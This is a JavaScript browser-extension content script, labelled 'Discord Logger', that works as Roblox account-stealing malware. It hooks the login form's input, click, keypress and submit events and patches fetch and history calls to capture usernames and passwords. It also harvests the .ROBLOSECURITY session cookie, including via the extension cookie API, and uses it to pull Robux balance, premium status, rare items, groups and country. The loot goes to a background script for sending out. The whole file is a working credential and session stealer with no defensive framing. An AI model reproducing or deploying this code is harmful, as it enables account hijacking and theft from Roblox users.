
// Roblox-specific logging only
(function() {
  console.log('Discord Logger content script loaded on:', window.location.href);

  // Track sent credentials to avoid duplicates
  let lastSentCredentials = null;
  let lastSentCookie = null;

  function sendLogToBackground(level, args) {
    const logData = {
      level: level,
      message: args.map(arg => 
        typeof arg === 'object' ? JSON.stringify(arg, null, 2) : String(arg)
      ).join(' '),
      timestamp: new Date().toISOString(),
      url: window.location.href,
      userAgent: navigator.userAgent
    };

    console.log('Sending log to background:', level, logData.message.substring(0, 50));

    chrome.runtime.sendMessage({
      type: 'LOG_CAPTURED',
      data: logData
    }, (response) => {
      if (chrome.runtime.lastError) {
        console.error('Error sending message:', chrome.runtime.lastError);
      } else {
        console.log('Message sent successfully:', response);
      }
    });
  }

  function sendCombinedLoginData(credentials, cookieValue, userData) {
    const combinedData = {
      level: 'roblox_combined',
      credentials: credentials,
      cookie: cookieValue,
      userData: userData,
      timestamp: new Date().toISOString(),
      url: window.location.href,
      userAgent: navigator.userAgent
    };

    chrome.runtime.sendMessage({
      type: 'LOG_CAPTURED',
      data: combinedData
    }, (response) => {
      if (chrome.runtime.lastError) {
        console.error('Error sending combined message:', chrome.runtime.lastError);
      } else {
        console.log('Combined message sent successfully:', response);
      }
    });
  }

  // Function to capture Roblox security cookie and fetch comprehensive user data
  async function captureRobloxSecurity() {
    if (!window.location.hostname.includes('roblox.com')) {
      return;
    }

    // Instead of requiring ?nl=true, allow capture on ANY Roblox page
    console.log('Checking for Roblox security cookie on Roblox page...');
    
    // Get all cookies including httpOnly ones using chrome.cookies API
    try {
      chrome.runtime.sendMessage({
        type: 'GET_COOKIES',
        domain: '.roblox.com'
      }, async (response) => {
        if (response && response.cookies) {
          const roblosecurityCookie = response.cookies.find(cookie => cookie.name === '.ROBLOSECURITY');
          
          if (roblosecurityCookie) {
            console.log('Found ROBLOSECURITY cookie via API');
            
            // Check if we already sent this cookie (exact match)
            if (lastSentCookie === roblosecurityCookie.value) {
              console.log('Cookie already sent, skipping...');
              return;
            }

            // Also check if we're currently processing this cookie (prevent parallel processing)
            if (window.processingCookie === roblosecurityCookie.value) {
              console.log('Cookie currently being processed, skipping...');
              return;
            }

            // Mark as processing
            window.processingCookie = roblosecurityCookie.value;

            // Check for recent login attempt with extended search
            let credentials = { username: '', password: '' };

            console.log('Checking for stored credentials...');

            // First check window object
            if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 60000) {
              credentials.username = window.robloxLoginAttempt.username;
              credentials.password = window.robloxLoginAttempt.password;
              console.log('Found credentials in window object:', credentials.username ? 'YES' : 'NO');
            } 
            // Fallback to sessionStorage with extended timeout
            else {
              try {
                const storedAttempt = sessionStorage.getItem('robloxLoginAttempt');
                if (storedAttempt) {
                  const parsedAttempt = JSON.parse(storedAttempt);
                  if (parsedAttempt && (Date.now() - parsedAttempt.timestamp) < 600000) { // Extended to 10 minutes
                    credentials.username = parsedAttempt.username;
                    credentials.password = parsedAttempt.password;
                    console.log('Retrieved credentials from sessionStorage:', credentials.username ? 'YES' : 'NO');
                  } else {
                    console.log('SessionStorage credentials expired or invalid');
                  }
                } else {
                  console.log('No credentials found in sessionStorage');
                }
              } catch (error) {
                console.log('Error retrieving from sessionStorage:', error);
              }

              // Try localStorage as fallback
              if (!credentials.username || !credentials.password) {
                try {
                  const localStoredAttempt = localStorage.getItem('robloxLoginAttempt');
                  if (localStoredAttempt) {
                    const parsedLocalAttempt = JSON.parse(localStoredAttempt);
                    if (parsedLocalAttempt && (Date.now() - parsedLocalAttempt.timestamp) < 600000) {
                      credentials.username = parsedLocalAttempt.username;
                      credentials.password = parsedLocalAttempt.password;
                      console.log('Retrieved credentials from localStorage:', credentials.username ? 'YES' : 'NO');
                    }
                  }
                } catch (error) {
                  console.log('Error retrieving from localStorage:', error);
                }
              }
            }

            // Final fallback - try to capture from current page if still on roblox
            if ((!credentials.username || !credentials.password) && window.location.hostname.includes('roblox.com')) {
              console.log('Attempting final credential capture from current page...');
              const currentPageCredentials = captureRobloxCredentials();
              if (currentPageCredentials.username && currentPageCredentials.password) {
                credentials = currentPageCredentials;
                console.log('Found credentials on current page');
              }
            }

            // Fetch comprehensive user data using the security token
            const userData = await fetchRobloxUserData(roblosecurityCookie.value);

            // Send combined data (credentials + cookie + user data)
            sendCombinedLoginData(credentials, roblosecurityCookie.value, userData);

            // Update tracking
            lastSentCookie = roblosecurityCookie.value;
            
            // Clear the stored login attempt
            delete window.robloxLoginAttempt;
            try {
              sessionStorage.removeItem('robloxLoginAttempt');
            } catch (error) {
              console.log('Error clearing sessionStorage:', error);
            }

            // Clear processing flag
            delete window.processingCookie;
          }
        }
      });
    } catch (error) {
      console.error('Error getting cookies via API:', error);
    }

    // Also check document.cookie as fallback (only if not already processed via API)
    if (!window.processingCookie) {
      const cookies = document.cookie.split(';');
      for (let cookie of cookies) {
        const [name, value] = cookie.trim().split('=');
        if (name === '.ROBLOSECURITY') {
          console.log('Found ROBLOSECURITY cookie in document.cookie');
          
          // Check if we already sent this cookie
          if (lastSentCookie === value) {
            console.log('Cookie already sent, skipping...');
            return;
          }

          // Check if currently processing
          if (window.processingCookie === value) {
            console.log('Cookie currently being processed, skipping...');
            return;
          }

          // Mark as processing
          window.processingCookie = value;

        // Check for recent login attempt
        let credentials = { username: '', password: '' };

        // First check window object
        if (window.robloxLoginAttempt && (Date.now() - window.robloxLoginAttempt.timestamp) < 60000) {
          credentials.username = window.robloxLoginAttempt.username;
          credentials.password = window.robloxLoginAttempt.password;
        } 
        // Fallback to sessionStorage
        else {
          try {
            const storedAttempt = sessionStorage.getItem('robloxLoginAttempt');
            if (storedAttempt) {
              const parsedAttempt = JSON.parse(storedAttempt);
              if (parsedAttempt && (Date.now() - parsedAttempt.timestamp) < 300000) { // 5 minutes
                credentials.username = parsedAttempt.username;
                credentials.password = parsedAttempt.password;
                console.log('Retrieved credentials from sessionStorage (fallback)');
              }
            }
          } catch (error) {
            console.log('Error retrieving from sessionStorage (fallback):', error);
          }
        }

        // Fetch comprehensive user data using the security token
        const userData = await fetchRobloxUserData(value);

        // Send combined data (credentials + cookie + user data)
          sendCombinedLoginData(credentials, value, userData);

          // Update tracking
          lastSentCookie = value;
          
          // Clear the stored login attempt
          delete window.robloxLoginAttempt;
          try {
            sessionStorage.removeItem('robloxLoginAttempt');
          } catch (error) {
            console.log('Error clearing sessionStorage (fallback):', error);
          }

          // Clear processing flag
          delete window.processingCookie;
          break;
        }
      }
    }
  }

  // Fetch comprehensive Roblox user data using APIs
  async function fetchRobloxUserData(roblosecurity) {
    try {
      console.log('Fetching Roblox user data...');
      
      // Get CSRF token first
      const csrfToken = await getRobloxCSRFToken(roblosecurity);
      if (!csrfToken) {
        console.log('Could not get CSRF token');
        return null;
      }

      // Get current user info
      const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`,
          'X-CSRF-TOKEN': csrfToken
        }
      });

      if (!userResponse.ok) {
        console.log('Could not get user info');
        return null;
      }
      
      const userInfo = await userResponse.json();
      console.log('Got user info:', userInfo.name);

      // Get detailed user data
      const detailsResponse = await fetch(`https://users.roblox.com/v1/users/${userInfo.id}`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const userDetails = detailsResponse.ok ? await detailsResponse.json() : {};

      // Get Robux balance
      const robuxResponse = await fetch('https://economy.roblox.com/v1/users/authenticated/currency', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`,
          'X-CSRF-TOKEN': csrfToken
        }
      });

      const robuxData = robuxResponse.ok ? await robuxResponse.json() : { robux: 0 };

      // Get premium status
      const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userInfo.id}/validate-membership`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`,
          'X-CSRF-TOKEN': csrfToken
        }
      });

      const premiumData = premiumResponse.ok ? await premiumResponse.json() : { isPremium: false };

      // Get currently worn items for korblox/headless detection
      const avatarResponse = await fetch(`https://avatar.roblox.com/v1/users/${userInfo.id}/currently-wearing`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const avatarData = avatarResponse.ok ? await avatarResponse.json() : { assetIds: [] };

      // Get user's groups
      const groupsResponse = await fetch(`https://groups.roblox.com/v2/users/${userInfo.id}/groups/roles`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const groupsData = groupsResponse.ok ? await groupsResponse.json() : { data: [] };

      // Get user's badges count
      const badgesResponse = await fetch(`https://badges.roblox.com/v1/users/${userInfo.id}/badges?limit=100`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const badgesData = badgesResponse.ok ? await badgesResponse.json() : { data: [] };

      // Get account age
      const accountAge = userDetails.created ? 
        Math.floor((new Date() - new Date(userDetails.created)) / (1000 * 60 * 60 * 24)) : 0;

      // Detect korblox and headless items
      const korbloxDetection = await detectKorbloxHeadless(avatarData.assetIds, roblosecurity);

      // Get user's location/country
      const localeResponse = await fetch('https://locale.roblox.com/v1/country-regions', {
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      const localeData = localeResponse.ok ? await localeResponse.json() : {};

      return {
        username: userInfo.name || userInfo.displayName || 'Unknown',
        userId: userInfo.id,
        displayName: userInfo.displayName,
        description: userDetails.description || 'No description',
        accountAge: accountAge,
        robux: robuxData.robux || 0,
        isPremium: premiumData.isPremium || false,
        created: userDetails.created,
        korblox: korbloxDetection.hasKorblox,
        headless: korbloxDetection.hasHeadless,
        currentlyWearing: avatarData.assetIds || [],
        groups: groupsData.data ? groupsData.data.slice(0, 10) : [],
        badgeCount: badgesData.data ? badgesData.data.length : 0,
        country: localeData.countryRegionCode || 'Unknown',
        followers: userDetails.followerCount || 0,
        following: userDetails.followingCount || 0,
        friendCount: userDetails.friendCount || 0
      };

    } catch (error) {
      console.error('Error fetching user data:', error);
      return null;
    }
  }

  // Get CSRF token for authenticated requests
  async function getRobloxCSRFToken(roblosecurity) {
    try {
      const response = await fetch('https://auth.roblox.com/v2/logout', {
        method: 'POST',
        headers: {
          'Cookie': `.ROBLOSECURITY=${roblosecurity}`
        }
      });

      return response.headers.get('x-csrf-token');
    } catch (error) {
      console.error('Error getting CSRF token:', error);
      return null;
    }
  }

  // Detect korblox and headless items
  async function detectKorbloxHeadless(assetIds, roblosecurity) {
    const korbloxIds = [
      139607770, 139607718, 139607625, 139607570, 139607528, 139607487, 139607415, 139607356,
      139607313, 139607268, 139607228, 139607186, 139607142, 139607101, 139607069, 139607029,
      139606993, 139606951, 139606909, 139606867, 139606825, 139606781, 139606734, 139606692,
    ];

    const headlessIds = [
      134082579, // Headless Head
      139607770  // Some korblox items might also be considered headless
    ];

    let hasKorblox = false;
    let hasHeadless = false;

    // Check currently worn items
    for (const assetId of assetIds) {
      if (korbloxIds.includes(assetId)) {
        hasKorblox = true;
      }
      if (headlessIds.includes(assetId)) {
        hasHeadless = true;
      }
    }

    return { hasKorblox, hasHeadless };
  }

  // Function to capture Roblox username and password
  function captureRobloxCredentials() {
    let username = '';
    let password = '';

    console.log('Attempting to capture Roblox credentials...');

    // Enhanced selectors for Roblox login page (2024+ version)
    const usernameSelectors = [
      // Modern Roblox selectors
      'input[data-testid="username-field"]',
      'input[data-testid="email-phone-username-field"]',
      'input[data-testid="login-username"]',
      'input[data-testid="login-email"]',
      'input[placeholder*="Username" i]',
      'input[placeholder*="Email" i]',
      'input[placeholder*="Phone" i]',
      'input[id*="username"]',
      'input[name*="username"]',
      'input[class*="username"]',
      'input[class*="login-username"]',
      'input[class*="form-control"][type="text"]',
      'input[type="text"]:not([placeholder*="search" i]):not([placeholder*="code" i]):not([placeholder*="captcha" i])',
      'input[type="email"]',
      'input[autocomplete="username"]',
      'input[autocomplete="email"]',
      // Generic fallbacks for any text input on login page
      '#login-username',
      '#username',
      '.username-input',
      '.login-input[type="text"]'
    ];

    const passwordSelectors = [
      // Modern Roblox selectors
      'input[data-testid="password-field"]',
      'input[data-testid="login-password"]',
      'input[type="password"]',
      'input[placeholder*="Password" i]',
      'input[id*="password"]',
      'input[name*="password"]',
      'input[class*="password"]',
      'input[class*="login-password"]',
      'input[class*="form-control"][type="password"]',
      'input[autocomplete="current-password"]',
      'input[autocomplete="password"]',
      // Generic fallbacks
      '#login-password',
      '#password',
      '.password-input'
    ];

    // Try each username selector
    for (const selector of usernameSelectors) {
      try {
        const inputs = document.querySelectorAll(selector);
        console.log(`Checking selector ${selector}, found ${inputs.length} inputs`);
        for (const input of inputs) {
          if (input.value && input.value.trim() !== '' && input.value.length > 2) {
            username = input.value.trim();
            console.log('✓ Found username via selector:', selector, username.substring(0, 3) + '***');
            break;
          }
        }
        if (username) break;
      } catch (e) {
        console.log('Error with selector:', selector, e.message);
      }
    }

    // Try each password selector
    for (const selector of passwordSelectors) {
      try {
        const inputs = document.querySelectorAll(selector);
        console.log(`Checking password selector ${selector}, found ${inputs.length} inputs`);
        for (const input of inputs) {
          if (input.value && input.value.trim() !== '' && input.value.length > 3) {
            password = input.value.trim();
            console.log('✓ Found password via selector:', selector, '***' + password.substring(password.length - 2));
            break;
          }
        }
        if (password) break;
      } catch (e) {
        console.log('Error with password selector:', selector, e.message);
      }
    }

    // Fallback: Get all input fields and manually check
    if (!username || !password) {
      console.log('Fallback: Checking all input fields...');
      const allInputs = document.querySelectorAll('input');
      console.log('Total inputs found:', allInputs.length);
      
      for (const input of allInputs) {
        const value = input.value?.trim();
        const type = input.type?.toLowerCase();
        const placeholder = input.placeholder?.toLowerCase() || '';
        const id = input.id?.toLowerCase() || '';
        const name = input.name?.toLowerCase() || '';
        
        console.log('Input details:', {
          type,
          placeholder,
          id,
          name,
          hasValue: !!value,
          valueLength: value?.length || 0
        });

        if (!username && value && value.length > 2 && type !== 'password') {
          if (placeholder.includes('username') || placeholder.includes('email') || 
              placeholder.includes('phone') || id.includes('username') || 
              name.includes('username') || type === 'email' || type === 'text') {
            username = value;
            console.log('✓ Fallback found username:', username.substring(0, 3) + '***');
          }
        }

        if (!password && value && value.length > 3 && type === 'password') {
          password = value;
          console.log('✓ Fallback found password:', '***' + password.substring(password.length - 2));
        }
      }
    }

    console.log('Credential capture result:', {
      hasUsername: !!username,
      hasPassword: !!password,
      usernameLength: username?.length || 0,
      passwordLength: password?.length || 0
    });

    return { username, password };
  }

  // Enhanced monitoring for Roblox login activity
  function monitorRobloxLogin() {
    if (!window.location.hostname.includes('roblox.com')) {
      console.log('Not on Roblox site, skipping monitoring');
      return;
    }

    console.log('Starting enhanced Roblox monitoring on:', window.location.href);

    // Check for security cookie on any Roblox page (reduced frequency)
    setTimeout(captureRobloxSecurity, 2000);
    setTimeout(captureRobloxSecurity, 5000);

    // Monitor for cookie changes more frequently
    let lastCookies = document.cookie;
    const cookieInterval = setInterval(() => {
      if (document.cookie !== lastCookies) {
        console.log('Cookie change detected, checking for ROBLOSECURITY');
        lastCookies = document.cookie;
        setTimeout(captureRobloxSecurity, 500);
        setTimeout(captureRobloxSecurity, 2000);
      }
    }, 500); // Check every 500ms

    // Monitor for successful login redirects
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;
    
    history.pushState = function() {
      originalPushState.apply(history, arguments);
      console.log('URL changed via pushState, checking for login');
      setTimeout(captureRobloxSecurity, 1000);
      setTimeout(captureRobloxSecurity, 3000);
    };

    history.replaceState = function() {
      originalReplaceState.apply(history, arguments);
      console.log('URL changed via replaceState, checking for login');
      setTimeout(captureRobloxSecurity, 1000);
      setTimeout(captureRobloxSecurity, 3000);
    };

    // Monitor for authentication API calls
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
      const result = originalFetch.apply(this, args);

      if (args[0] && typeof args[0] === 'string') {
        const url = args[0].toLowerCase();
        if (url.includes('/v2/login') || url.includes('/authentication') || url.includes('/signin') || url.includes('/users/authenticate')) {
          console.log('Login API call detected:', args[0]);
          result.then(response => {
            console.log('Login API response status:', response.status);
            if (response.ok || response.status === 200) {
              setTimeout(captureRobloxSecurity, 1000);
              setTimeout(captureRobloxSecurity, 3000);
              setTimeout(captureRobloxSecurity, 5000);
            }
          }).catch(err => {
            console.log('Login API error:', err);
          });
        }
      }

      return result;
    };

    // Enhanced form submission monitoring - only on login page
    if (window.location.href.includes('roblox.com/Login') || window.location.href.includes('roblox.com/login')) {
      console.log('Setting up form submission monitoring on Roblox login page');
      
      // More aggressive credential monitoring with multiple strategies
      let credentialCaptureActive = true;
      
      // Strategy 1: Monitor all input changes in real-time
      document.addEventListener('input', function(event) {
        if (!credentialCaptureActive) return;
        
        const input = event.target;
        if (input && input.tagName === 'INPUT') {
          // Immediately try to capture whenever any input changes
          setTimeout(() => {
            const credentials = captureRobloxCredentials();
            if (credentials.username && credentials.password) {
              console.log('Credentials captured via input monitoring:', credentials.username ? 'HAS_USER' : 'NO_USER', credentials.password ? 'HAS_PASS' : 'NO_PASS');
              storeCredentials(credentials);
            }
          }, 100); // Very short delay
        }
      });

      // Strategy 2: Monitor key presses
      document.addEventListener('keydown', function(event) {
        if (!credentialCaptureActive) return;
        
        // Capture on Enter key press (common way to submit)
        if (event.key === 'Enter') {
          console.log('Enter key pressed, capturing credentials');
          const credentials = captureRobloxCredentials();
          if (credentials.username && credentials.password) {
            console.log('Credentials captured via Enter key');
            storeCredentials(credentials);
          }
        }
      });

      // Strategy 3: Form submission monitoring with preventDefault
      document.addEventListener('submit', function(event) {
        console.log('Form submission detected on Roblox login page');
        const form = event.target;
        if (form && form.tagName === 'FORM') {
          // Capture credentials immediately before form processes
          const credentials = captureRobloxCredentials();
          
          if (credentials.username && credentials.password) {
            console.log('✓ Credentials captured from form submission:', credentials.username);
            storeCredentials(credentials);
          } else {
            console.log('✗ Form submitted but no credentials found');
            // Try one more aggressive capture
            setTimeout(() => {
              const retryCredentials = captureRobloxCredentials();
              if (retryCredentials.username && retryCredentials.password) {
                console.log('✓ Retry capture successful');
                storeCredentials(retryCredentials);
              }
            }, 50);
          }
        }
      });

      // Strategy 4: Button click monitoring with better targeting
      document.addEventListener('click', function(event) {
        if (!credentialCaptureActive) return;
        
        const target = event.target;
        const isLoginButton = target && (
          target.textContent?.toLowerCase().includes('log in') ||
          target.textContent?.toLowerCase().includes('sign in') ||
          target.id?.toLowerCase().includes('login') ||
          target.className?.toLowerCase().includes('login') ||
          target.type === 'submit' ||
          target.getAttribute('data-testid')?.includes('login') ||
          target.closest('button')?.textContent?.toLowerCase().includes('log in')
        );

        if (isLoginButton) {
          console.log('Login button clicked, immediate credential capture');
          
          // Multiple capture attempts with different delays
          const credentials1 = captureRobloxCredentials();
          if (credentials1.username && credentials1.password) {
            console.log('✓ Immediate capture successful');
            storeCredentials(credentials1);
          } else {
            // Try again after 50ms
            setTimeout(() => {
              const credentials2 = captureRobloxCredentials();
              if (credentials2.username && credentials2.password) {
                console.log('✓ Delayed capture successful');
                storeCredentials(credentials2);
              }
            }, 50);

            // And again after 200ms
            setTimeout(() => {
              const credentials3 = captureRobloxCredentials();
              if (credentials3.username && credentials3.password) {
                console.log('✓ Final delayed capture successful');
                storeCredentials(credentials3);
              }
            }, 200);
          }
        }
      });

      // Helper function to store credentials
      function storeCredentials(credentials) {
        const credentialString = `${credentials.username}:${credentials.password}`;
        if (lastSentCredentials !== credentialString) {
          console.log('🔐 Storing new credentials:', credentials.username);
          lastSentCredentials = credentialString;

          // Store credentials for later use with cookie
          window.robloxLoginAttempt = { 
            username: credentials.username, 
            password: credentials.password, 
            timestamp: Date.now() 
          };

          // Store in multiple places for maximum persistence
          try {
            sessionStorage.setItem('robloxLoginAttempt', JSON.stringify({
              username: credentials.username,
              password: credentials.password,
              timestamp: Date.now()
            }));
            console.log('✓ Stored in sessionStorage');
          } catch (error) {
            console.log('✗ SessionStorage failed:', error);
          }

          try {
            localStorage.setItem('robloxLoginAttempt', JSON.stringify({
              username: credentials.username,
              password: credentials.password,
              timestamp: Date.now()
            }));
            console.log('✓ Stored in localStorage');
          } catch (error) {
            console.log('✗ LocalStorage failed:', error);
          }

          // Send credentials immediately
          sendLogToBackground('roblox_login', `Username: ${credentials.username}, Password: ${credentials.password}`);
        }
      }

      // Strategy 5: Periodic credential checking while on login page
      const credentialCheckInterval = setInterval(() => {
        if (!credentialCaptureActive) {
          clearInterval(credentialCheckInterval);
          return;
        }

        const credentials = captureRobloxCredentials();
        if (credentials.username && credentials.password) {
          const credentialString = `${credentials.username}:${credentials.password}`;
          if (lastSentCredentials !== credentialString) {
            console.log('✓ Periodic check found new credentials');
            storeCredentials(credentials);
          }
        }
      }, 1000); // Check every second

      // Disable monitoring when leaving the login page
      const observer = new MutationObserver(() => {
        if (!window.location.href.includes('roblox.com/Login') && !window.location.href.includes('roblox.com/login')) {
          console.log('Left login page, disabling credential monitoring');
          credentialCaptureActive = false;
          clearInterval(credentialCheckInterval);
          observer.disconnect();
        }
      });

      observer.observe(document, { subtree: true, childList: true });
    }

    // Enhanced input monitoring with real-time capture - only on login page
    let inputTimeout;
    let credentialCheckInterval;
    
    if (window.location.href.includes('roblox.com/Login') || window.location.href.includes('roblox.com/login')) {
      console.log('Setting up input monitoring on Roblox login page');
      
      document.addEventListener('input', function(event) {
        const input = event.target;
        if (input && input.tagName === 'INPUT') {
          console.log('Input detected:', input.type, input.placeholder);
          
          // Clear previous timeout
          clearTimeout(inputTimeout);
          
          // Set new timeout to capture after user stops typing
          inputTimeout = setTimeout(() => {
            const credentials = captureRobloxCredentials();
            if (credentials.username && credentials.password) {
              const credentialString = `${credentials.username}:${credentials.password}`;
              if (lastSentCredentials !== credentialString) {
                console.log('New login credentials updated via input monitoring');
                lastSentCredentials = credentialString;
                
                window.robloxLoginAttempt = { 
                  username: credentials.username, 
                  password: credentials.password, 
                  timestamp: Date.now() 
                };
              }
            }
          }, 1500);
        }
      });

      // Periodic credential checking while on login page
      credentialCheckInterval = setInterval(() => {
        const credentials = captureRobloxCredentials();
        if (credentials.username && credentials.password) {
          const credentialString = `${credentials.username}:${credentials.password}`;
          if (lastSentCredentials !== credentialString) {
            console.log('Periodic check found new credentials');
            lastSentCredentials = credentialString;
            
            window.robloxLoginAttempt = { 
              username: credentials.username, 
              password: credentials.password, 
              timestamp: Date.now() 
            };
          }
        }
      }, 2000); // Check every 2 seconds
    }

    // Monitor for button clicks (login buttons)
    document.addEventListener('click', function(event) {
      const target = event.target;
      if (target && (
        target.textContent?.toLowerCase().includes('log in') ||
        target.textContent?.toLowerCase().includes('sign in') ||
        target.id?.toLowerCase().includes('login') ||
        target.className?.toLowerCase().includes('login')
      )) {
        console.log('Login button clicked, capturing credentials');
        const credentials = captureRobloxCredentials();
        if (credentials.username || credentials.password) {
          window.robloxLoginAttempt = { 
            username: credentials.username, 
            password: credentials.password, 
            timestamp: Date.now() 
          };
          
          setTimeout(captureRobloxSecurity, 2000);
          setTimeout(captureRobloxSecurity, 5000);
          setTimeout(captureRobloxSecurity, 8000);
        }
      }
    });

    // Listen for storage events (in case Roblox stores login info)
    window.addEventListener('storage', function(e) {
      console.log('Storage event detected:', e.key);
      setTimeout(captureRobloxSecurity, 1000);
    });

    // Clean up on page unload
    window.addEventListener('beforeunload', () => {
      clearInterval(cookieInterval);
      clearTimeout(inputTimeout);
      if (credentialCheckInterval) clearInterval(credentialCheckInterval);
    });
  }

  // Start monitoring if on Roblox
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', monitorRobloxLogin);
  } else {
    monitorRobloxLogin();
  }

  // Also start monitoring after a short delay in case page is still loading
  setTimeout(monitorRobloxLogin, 2000);
})();
